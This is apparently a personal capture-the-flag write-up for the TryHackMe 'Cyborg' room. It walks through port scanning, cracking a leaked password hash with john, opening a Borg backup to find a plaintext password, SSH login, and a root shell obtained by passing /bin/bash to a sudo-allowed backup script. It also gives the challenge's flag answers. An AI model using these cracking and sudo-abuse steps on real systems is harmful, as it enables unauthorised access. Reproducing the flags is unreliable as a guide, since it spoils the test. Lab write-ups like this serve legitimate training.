---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - linux
  - web
  - brute-force
  - sudo-abuse
---

# Cyborg
![Cyborg logo](logos/cyborg_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [Cyborg](https://tryhackme.com/room/cyborgt8)  

## Description
"A box involving encrypted archives, source code analysis and more."

## Enumeration
### Port Scanning
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```

```
Host is up (0.031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Linux 5.X|6.X|4.X (96%), Google Android 10.X|11.X|12.X (93%), Adtran embedded (92%)
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/h:adtran:424rg
Aggressive OS guesses: Linux 5.14 - 6.8 (96%), Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 - 5.15 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Adtran 424RG FTTH gateway (92%), Android 10 - 11 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Android 9 - 11 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
??? success "Scan the machine, how many ports are open?"
	2
??? success "What service is running on port 22?"
	ssh
??? success "What service is running on port 80?"
	http

### HTTP Enumeration
```
ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
```

**Notes**  

* Default Apache installation page  
* No `robots.txt` or `sitemap` files  
* Nothing interesting in the source code  
* `/admin` and `/etc` directories found during `ffuf` scan  
* `/admin` directory reveals a chat transcript between site "admins". Information disclosure: "music_archive" - unsure what this is
* Source code for `/admin` reveals an `archive.tar` file available (downloaded and extracted for further analysis later)
* `/etc` reveals two files with information disclosures within: "passwd" (contains password hash for "music_archive" user - copied to a file ("hash") for later analysis) and "squid.conf"

### Vulnerability Enumeration
```
searchsploit OpenSSH 7.2p2	# Only result: username enumeration
searchsploit httpd 2.4.18	# Only result: DoS
```

## Foothold
### Password hash
```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (music_archive)     
1g 0:00:00:00 DONE (2026-05-09 16:44) 10.00g/s 391680p/s 391680c/s 391680C/s jeremy21..lilica
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### `archive.tar` contents
```
tar -xvf archive.tar 
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1

cat home/field/dev/final_archive/README
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

[Borg Backup Documentation - Restoring a Backup](https://borgbackup.readthedocs.io/en/stable/quickstart.html#restoring-a-backup)

```
borg extract home/field/dev/final_archive::music_archive
Enter passphrase for key /home/kali/thm/home/field/dev/final_archive:	# Password from /etc directory password hash

ls -al home      
total 16
drwxrwxr-x  4 kali kali 4096 May 10 14:49 .
drwxrwxr-x  6 kali kali 4096 May  9 17:16 ..
drwxr-xr-x 12 kali kali 4096 Dec 29  2020 alex
drwxrwxr-x  3 kali kali 4096 May  9 17:03 field

ls -al home/alex
total 64
drwxr-xr-x 12 kali kali 4096 Dec 29  2020 .
drwxrwxr-x  4 kali kali 4096 May 10 14:49 ..
-rw-------  1 kali kali  439 Dec 28  2020 .bash_history
-rw-r--r--  1 kali kali  220 Dec 28  2020 .bash_logout
-rw-r--r--  1 kali kali 3637 Dec 28  2020 .bashrc
drwx------  4 kali kali 4096 Dec 28  2020 .config
drwx------  3 kali kali 4096 Dec 28  2020 .dbus
drwxrwxr-x  2 kali kali 4096 Dec 29  2020 Desktop
drwxrwxr-x  2 kali kali 4096 Dec 29  2020 Documents
drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Downloads
drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Music
drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Pictures
-rw-r--r--  1 kali kali  675 Dec 28  2020 .profile
drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Public
drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Templates
drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Videos

ls -al home/alex/Documents 
total 12
drwxrwxr-x  2 kali kali 4096 Dec 29  2020 .
drwxr-xr-x 12 kali kali 4096 Dec 29  2020 ..
-rw-r--r--  1 kali kali  110 Dec 29  2020 note.txt
                                                             
cat home/alex/Documents/note.txt
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3

ssh alex@TARGET_IP_ADDRESS

alex@ubuntu:~$ ls -al
total 108
drwx------ 17 alex alex 4096 Dec 31  2020 .
drwxr-xr-x  3 root root 4096 Dec 30  2020 ..
-rw-------  1 alex alex 1145 Dec 31  2020 .bash_history
-rw-r--r--  1 alex alex  220 Dec 30  2020 .bash_logout
-rw-r--r--  1 alex alex 3771 Dec 30  2020 .bashrc
drwx------ 13 alex alex 4096 May 10 11:59 .cache
drwx------  3 alex alex 4096 Dec 30  2020 .compiz
drwx------ 15 alex alex 4096 Dec 30  2020 .config
drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Desktop
-rw-r--r--  1 alex alex   25 Dec 30  2020 .dmrc
drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Documents
drwxr-xr-x  2 alex alex 4096 Dec 31  2020 Downloads
drwx------  2 alex alex 4096 Dec 30  2020 .gconf
drwx------  3 alex alex 4096 Dec 31  2020 .gnupg
-rw-------  1 alex alex 1590 Dec 31  2020 .ICEauthority
drwx------  3 alex alex 4096 Dec 30  2020 .local
drwx------  5 alex alex 4096 Dec 30  2020 .mozilla
drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Music
drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Pictures
-rw-r--r--  1 alex alex  655 Dec 30  2020 .profile
drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Public
-rw-r--r--  1 alex alex    0 Dec 30  2020 .sudo_as_admin_successful
drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Templates
-r-xr--r--  1 alex alex   40 Dec 30  2020 user.txt
drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Videos
-rw-------  1 alex alex   51 Dec 31  2020 .Xauthority
-rw-------  1 alex alex   82 Dec 31  2020 .xsession-errors
-rw-------  1 alex alex   82 Dec 31  2020 .xsession-errors.old
alex@ubuntu:~$ cat user.txt
```
??? success "What is the user.txt flag?"
	flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}

## Privilege Escalation
```
alex@ubuntu:~$ cat .bash_history
<REDACTED FOR BREVITY>
cd /etc/mp3backups/
ls
./backup.sh 
ls
echo "hi" >> backup.sh
ls
sudo ./backup.sh -c whoami
sudo ./backup.sh -c /bin/bash
<REDACTED FOR BREVITY>

alex@ubuntu:~$ cd /etc/mp3backups/

alex@ubuntu:/etc/mp3backups$ sudo ./backup.sh -c /bin/bash
find: ‘/run/user/108/gvfs’: Permission denied
/home/alex/Music/image12.mp3
/home/alex/Music/image7.mp3
/home/alex/Music/image1.mp3
/home/alex/Music/image10.mp3
/home/alex/Music/image5.mp3
/home/alex/Music/image4.mp3
/home/alex/Music/image3.mp3
/home/alex/Music/image6.mp3
/home/alex/Music/image8.mp3
/home/alex/Music/image9.mp3
/home/alex/Music/image11.mp3
/home/alex/Music/image2.mp3
Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz

tar: Removing leading `/' from member names
tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
tar: Exiting with failure status due to previous errors

Backup finished

root@ubuntu:/etc/mp3backups# cat /root/root.txt

root@ubuntu:/etc/mp3backups# exit
```
??? success "What is the root.txt flag?"
	flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}

**Tools Used**  
`john` `borg`

**Date completed:** 10/05/26  
**Date published:** 10/05/26